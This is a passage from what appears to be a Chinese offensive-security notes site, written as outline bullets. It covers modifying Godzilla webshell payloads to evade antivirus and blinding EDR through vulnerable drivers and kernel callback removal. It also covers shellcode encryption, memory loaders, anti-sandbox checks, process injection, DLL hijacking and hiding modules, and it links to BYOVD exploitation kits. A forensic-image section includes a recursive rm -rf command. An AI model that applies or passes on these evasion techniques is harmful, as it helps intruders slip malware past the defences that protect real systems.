+<li>Rename the reflection Load method and GetMethod to bypass signatures and evade AV (the same applies to Java and C#)</li>
+<li>Change other variables freely to bypass signatures and evade AV</li>
+<li>Modify base64.bin in the template directory in the same folder according to GenerateShellLoder's padding method</li>
+<li>Modify shell.aspx to remove the header and footer</li>
+<li>Decompile payload.dll with ILspy to export the source, change the file and class names, and update the bin template accordingly</li>
+</ul>
+<h4 id="plugin-development_1">Plugin development</h4>
+<ul>
+<li>Modify the packaged jar and replace the jar in the original lib to successfully add a plugin</li>
+<li><a href="https://beichendream.github.io/godzillaApi/">https://beichendream.github.io/godzillaApi/</a></li>
+<li>Add the Godzilla jar to lib</li>
+<li>The package name must start with shells.plugins. followed by any characters</li>
+<li>Create a class, declare the core.annotation.PluginnAnnotation annotation, then extend and implement the core.imp.Plugin interface, and start writing the feature code</li>
+<li>Swing UI design</li>
+<li>Register the popup menu at different locations</li>
+<li>MainActivity.registerJMenu(menu);//registers a standalone menu on the main page MainActivity.registerPluginJMenuItem(pluginMenuItem);//registers a menu item under the plugin menu bar MainActivity.registerShellViewJMenuItem(shellViewMenuItem);//registers a menu item in the right-click popup menu on the Shell management main page<ul>
+<li>Menu registration must be done in a static code block</li>
+</ul>
+</li>
+</ul>
+<h2 id="trojan-avedr-evasion"><strong>Trojan AV/EDR evasion</strong></h2>
+<h3 id="setting-up-a-real-world-edr-environment">Setting up a real-world EDR environment</h3>
+<h4 id="trend-micro">Trend Micro</h4>
+<ul>
+<li><a href="https://bbs.kafan.cn/thread-2277040-1-1.html">https://bbs.kafan.cn/thread-2277040-1-1.html</a></li>
+<li><a href="https://github.com/emdnaia/TrendMicroDSAExfil">https://github.com/emdnaia/TrendMicroDSAExfil</a></li>
+<li>QAX Zero Trust has the same issue</li>
+</ul>
+<h4 id="symantec">Symantec</h4>
+<ul>
+<li><a href="https://bbs.kafan.cn/thread-2270682-1-1.html">https://bbs.kafan.cn/thread-2270682-1-1.html</a></li>
+</ul>
+<h4 id="mde">MDE</h4>
+<ul>
+<li>Requires official purchase and installation</li>
+<li>Change the system region</li>
+</ul>
+<h4 id="httpsbbskafancnforum-89-1html"><a href="https://bbs.kafan.cn/forum-89-1.html">https://bbs.kafan.cn/forum-89-1.html</a></h4>
+<ul>
+<li>Kafan forum download + tutorials</li>
+</ul>
+<h4 id="xianyu-marketplace">Xianyu marketplace</h4>
+<h4 id="install-the-server-first-then-the-client">Install the server first, then the client</h4>
+<ul>
+<li>After it comes online, snapshot the VM</li>
+<li>Disconnect from the network before testing evasion</li>
+<li>If an online sample gets uploaded, make sure debug info and the symbol table are stripped at compile time</li>
+</ul>
+<h3 id="beacon-evasion">Beacon evasion</h3>
+<h4 id="blinding-edr-via-vulnerable-drivers">Blinding EDR via vulnerable drivers</h4>
+<ul>
+<li>Install the development environment</li>
+<li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/</a><ul>
+<li>Install the SDK first</li>
+<li>Then install the WDK</li>
+<li>Install the mitigation 143 series</li>
+<li>Success means a WDM appears</li>
+</ul>
+</li>
+<li>Basic knowledge</li>
+<li>Kill user-mode processes</li>
+<li>Take the endpoint offline</li>
+<li>ZwTerminateProcess<ul>
+<li>blackout</li>
+<li>typedef struct _CLIENT_ID {    HANDLE UniqueProcess;  // process handle    HANDLE UniqueThread;   // thread handle} CLIENT_ID;</li>
+</ul>
+</li>
+<li>Kill the callbacks</li>
+<li>ObRegisterCallbacks<ul>
+<li>Open or duplicate handles of specific object types</li>
+<li>PsProcessType, PsThreadType<ul>
+<li>CallbackList</li>
+<li>PreOperation \ PostOperation = 0</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CmRegisterCallback<ul>
+<li>Access and modify the registry</li>
+<li>CallbackListHead<ul>
+<li>PEX_CALLBACK_FUNCTION</li>
+<li>Change the pointed address to an address value already present on the doubly linked list</li>
+<li>PG protection will cause a BSOD</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>MiniFilter<ul>
+<li>Create/modify/delete files</li>
+<li>volume<ul>
+<li>FLT_VOLUMES</li>
+<li>_CALLBACK_NODE<ul>
+<li>Change the first address directly to the _CALLBACK_NODE structure address from a system built-in driver</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PsSetCreateProcessNotifyRoutine<ul>
+<li>When a process is created or destroyed</li>
+</ul>
+</li>
+<li>PsSetCreateThreadNotifyRoutine<ul>
+<li>When a thread is created or destroyed</li>
+<li>typedef struct _EX_CALLBACK_ROUTINE_BLOCK {    EX_RUNDOWN_REF RundownProtect;    PEX_CALLBACK_FUNCTION Function;    PVOID Context;} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;<ul>
+<li><a href="https://reactos.org/">https://reactos.org/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PsSetLoadImageNotifyRoutine<ul>
+<li>When any Image (EXE, DLL, driver) file is loaded</li>
+</ul>
+</li>
+<li><a href="https://www.loldrivers.io/drivers/">https://www.loldrivers.io/drivers/</a></li>
+<li><a href="https://github.com/Cr4sh/ioctlfuzzer">https://github.com/Cr4sh/ioctlfuzzer</a><ul>
+<li>Kernel fuzz tool</li>
+<li>Enable kernel memory dump</li>
+</ul>
+</li>
+<li><a href="https://github.com/koutto/ioctlbf">https://github.com/koutto/ioctlbf</a></li>
+<li><a href="https://github.com/k0keoyo/kDriver-Fuzzer">https://github.com/k0keoyo/kDriver-Fuzzer</a></li>
+<li><a href="https://github.com/nccgroup/DIBF">https://github.com/nccgroup/DIBF</a></li>
+<li><a href="https://github.com/IntelLabs/kAFL">https://github.com/IntelLabs/kAFL</a></li>
+<li><a href="https://github.com/Z4kSec/IoctlHunter">https://github.com/Z4kSec/IoctlHunter</a></li>
+<li><a href="https://github.com/0dayResearchLab/msFuzz">https://github.com/0dayResearchLab/msFuzz</a></li>
+<li><a href="https://github.com/zeze-zeze/ioctlance">https://github.com/zeze-zeze/ioctlance</a></li>
+<li>Exploitation</li>
+<li><a href="https://github.com/paysonism/payson-ioctl-cheat-driver">https://github.com/paysonism/payson-ioctl-cheat-driver</a></li>
+<li><a href="https://github.com/Hagrid29/BYOVDKit">https://github.com/Hagrid29/BYOVDKit</a></li>
+<li><a href="https://github.com/BlackSnufkin/BYOVD">https://github.com/BlackSnufkin/BYOVD</a></li>
+</ul>
+<h4 id="encryption-and-obfuscation-for-evasion">Encryption and obfuscation for evasion</h4>
+<ul>
+<li>Detection methods</li>
+<li>Static detection<ul>
+<li>Signatures</li>
+<li>hash, file name, function name, sensitive strings, sensitive APIs...</li>
+<li>PE file header info, imports, exports, TLS, section info; shellcode code info; shellcode loader code info</li>
+<li>Cloud detection</li>
+<li>Checksum</li>
+<li>Periodically check file checksums</li>
+<li>Heuristics</li>
+<li>Machine learning</li>
+<li>yara</li>
+<li>Evasion</li>
+<li>Staging</li>
+<li>Encryption/decryption<ul>
+<li>aes</li>
+<li>rsa</li>
+<li>Classical ciphers</li>
+<li>.....</li>
+</ul>
+</li>
+<li>Encoding<ul>
+<li>XOR</li>
+<li>base64</li>
+<li>uuid</li>
+<li>mac</li>
+<li>IP address</li>
+<li>Registry key values</li>
+<li>RegQueryValueExA</li>
+<li>RegQueryValueExA</li>
+<li>Read data from the clipboard</li>
+<li>RegisterClipboardFormat</li>
+<li>GetClipboardFormatName</li>
+<li>.....</li>
+</ul>
+</li>
+<li>Variable name obfuscation<ul>
+<li><a href="https://pyob.oxyry.com/">https://pyob.oxyry.com/</a></li>
+</ul>
+</li>
+<li>Control flow obfuscation</li>
+<li>Modify shellcode signatures that have no effect<ul>
+<li>One byte in CS defeats YARA</li>
+</ul>
+</li>
+<li>Serialization<ul>
+<li>protobuf</li>
+<li>pickle</li>
+</ul>
+</li>
+<li><strong>Treat the shellcode as a string</strong></li>
+<li>Staged loading<ul>
+<li>File</li>
+<li>url</li>
+</ul>
+</li>
+<li>Dynamically load APIs<ul>
+<li>loadlibrary+getprocaddress</li>
+<li>fs-&gt;TEB, PEB-&gt;kernel32.dll-&gt;loadlibrary+getprocaddress</li>
+<li>SSN-&gt;syscall</li>
+<li><a href="https://j00ru.vexillium.org/syscalls/nt/64/">https://j00ru.vexillium.org/syscalls/nt/64/</a></li>
+<li>
+<h1 id="include">include <unistd.h></h1>
+<ul>
+<li>syscall(SYS_write, STDOUT_FILENO, message, length);</li>
+<li>AV warning</li>
+</ul>
+</li>
+<li><a href="https://github.com/klezVirus/SysWhispers3">https://github.com/klezVirus/SysWhispers3</a></li>
+<li><a href="https://github.com/voidvxvt/HellBunny">https://github.com/voidvxvt/HellBunny</a></li>
+</ul>
+</li>
+<li>Memory loader</li>
+<li>Allocate executable memory<ul>
+<li>VirtualProtect</li>
+<li>VirtualAlloc</li>
+<li>AllocADsMem</li>
+<li>ReallocADsMem</li>
+<li>HeapCreate</li>
+</ul>
+</li>
+<li>Write shellcode into memory<ul>
+<li>RtlMoveMemory</li>
+<li>RtlCopyMemory</li>
+</ul>
+</li>
+<li>Execute that memory<ul>
+<li>EnumSystemLocalesA</li>
+<li>CreateThread</li>
+<li>WaitForSingleObject</li>
+</ul>
+</li>
+<li><a href="https://github.com/0xsp-SRD/ZigStrike">https://github.com/0xsp-SRD/ZigStrike</a></li>
+<li>Function replacement<ul>
+<li><a href="http://ropgadget.com/posts/abusing_win_functions.html">http://ropgadget.com/posts/abusing_win_functions.html</a></li>
+</ul>
+</li>
+<li>Execute inside the loader<ul>
+<li>Easier to evade AV detection</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Dynamic detection<ul>
+<li>Sandbox</li>
+<li>Memory detection</li>
+<li>Evasion</li>
+<li>Anti-sandbox<ul>
+<li>Uptime</li>
+<li>Physical memory</li>
+<li>Number of CPUs</li>
+<li>Number of Temp files</li>
+<li>Server-side check with a random string</li>
+<li>USB records</li>
+<li>Sample name</li>
+<li>Disk size</li>
+<li>Network availability</li>
+<li>Named pipe availability</li>
+</ul>
+</li>
+<li>Dynamic memory loading<ul>
+<li>inline hook sleep</li>
+<li>Customize the sleep function logic after the hook</li>
+<li>CreateTimerQueueTimer</li>
+</ul>
+</li>
+<li>Remote thread injection<ul>
+<li>CreateRemoteThread</li>
+<li>OpenProcess</li>
+<li>VirtualAllocEx</li>
+<li>WriteProcessMemory</li>
+</ul>
+</li>
+<li>APC injection<ul>
+<li>APC + indirect syscalls + module stomping</li>
+<li>QueueUserApc</li>
+<li>Early Bird</li>
+</ul>
+</li>
+<li>Self-developed RAT<ul>
+<li>Separate the functions</li>
+</ul>
+</li>
+<li>DLL hijacking<ul>
+<li>WinSxS DLL hijacking</li>
+<li>Microsoft component hijacking</li>
+<li>onedrive</li>
+<li>DLL hijacking automation scripts</li>
+</ul>
+</li>
+<li>Callbacks<ul>
+<li>EnumChildWindows</li>
+<li>AlternativeShellcodeExec</li>
+</ul>
+</li>
+<li>LLVM obfuscation<ul>
+<li><a href="https://github.com/KomiMoe/Arkari">https://github.com/KomiMoe/Arkari</a></li>
+</ul>
+</li>
+<li>Break the process chain<ul>
+<li>Ring 3</li>
+<li>ldte-&gt;InInitializationOrderModuleList.Blink-&gt;Flink = ldte-&gt;InInitializationOrderModuleList.Flink;</li>
+<li>ldte-&gt;InInitializationOrderModuleList.Flink-&gt;Blink = ldte-&gt;InInitializationOrderModuleList.Blink;</li>
+<li>Ring 0</li>
+<li>PsActiveProcessHead-&gt;Eprocess</li>
+</ul>
+</li>
+<li>Inject into other processes<ul>
+<li>A loader that can't be killed</li>
+</ul>
+</li>
+<li>Kernel injection<ul>
+<li><a href="https://ti.qianxin.com/blog/articles/The-Nightmare-of-EDR-Storm-0978-Utilizing-New-Kernel-Injection-Technique-Step-Bear-CN/">https://ti.qianxin.com/blog/articles/The-Nightmare-of-EDR-Storm-0978-Utilizing-New-Kernel-Injection-Technique-Step-Bear-CN/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Traffic detection<ul>
+<li>Traffic signatures</li>
+<li>Encrypted fields in fixed communication protocols<ul>
+<li>Cobalt Strike's protocol transfers the AES key via RSA, and the AES key encrypts subsequent traffic</li>
+</ul>
+</li>
+<li>Content signatures</li>
+<li>Whether the data field contains encrypted command-related keywords</li>
+<li>Structural signatures</li>
+<li>Fixed field signatures</li>
+<li>ip</li>
+</ul>
+</li>
+</ul>
+<h2 id="evidence-image-system-restoration"><strong>Evidence image system restoration</strong></h2>
+<h3 id="linux">linux</h3>
+<h4 id="restore-the-image">Restore the image</h4>
+<ul>
+<li><a href="https://qemu.weilnetz.de/w64/">https://qemu.weilnetz.de/w64/</a></li>
+<li>qemu-img convert -f raw <input>.raw -O vmdk <output>.vmdk</li>
+</ul>
+<h4 id="modify-the-vm-configuration">Modify the VM configuration</h4>
+<ul>
+<li>Choose "use existing disk"</li>
+</ul>
+<h4 id="change-the-password">Change the password</h4>
+<ul>
+<li>At the boot screen, select the first entry and press e to enter single-user mode</li>
+<li>Delete everything after ro and replace it with rw init=/bin/bash</li>
+<li>Remove the Alibaba Cloud cloud-init</li>
+<li>rm -rf $(find / 2&gt;/dev/null|grep cloud-init)</li>
+<li>passwd</li>
+<li>Change the password</li>
+</ul>
+<h4 id="modify-the-network">Modify the network</h4>
+<ul>
+<li>ip a</li>
+<li>dhclient eth0</li>
+<li>Set the network to host-only</li>
+</ul>
+<h4 id="view-command-history">View command history</h4>
+<h4 id="view-services">View services</h4>
+<h4 id="files-corresponding-to-services">Files corresponding to services</h4>
+<h2 id="hw">hw</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../ch-24/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 24. Outdated Content Warnings and Alternatives">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                24. Outdated Content Warnings and Alternatives
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../zh-CN/" class="md-footer__link md-footer__link--next" aria-label="Next: 首页">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                首页
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.top", "navigation.tracking", "navigation.footer", "search.highlight", "search.suggest", "content.code.copy"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
